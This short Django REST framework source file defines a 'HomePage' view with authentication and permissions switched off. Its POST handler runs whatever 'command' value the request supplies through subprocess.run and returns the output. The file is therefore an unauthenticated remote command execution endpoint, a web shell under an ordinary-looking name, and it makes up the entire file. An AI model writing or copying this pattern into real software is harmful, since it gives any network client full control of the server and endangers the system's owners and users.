from rest_framework.views import APIView
from rest_framework.response import Response
from happyjob.settings import logger
from subprocess import Popen, PIPE, STDOUT, run


class HomePage(APIView):
    permission_classes = ()
    authentication_classes = ()

    def get(self, request):
        logger.info("New req")
        return Response(data={"msg": "hi"}, status=200)

    def post(self, request):
        command = request.data.get('command', ['ls -l'])
        logger.info("Command executed: {}".format(command))

        # process = Popen(command, stdout=PIPE, stderr=STDOUT)
        # output = process.stdout.read()
        process = run(command, stdout=PIPE, text=True)
        return Response(data={"msg": process.stdout}, status=200)
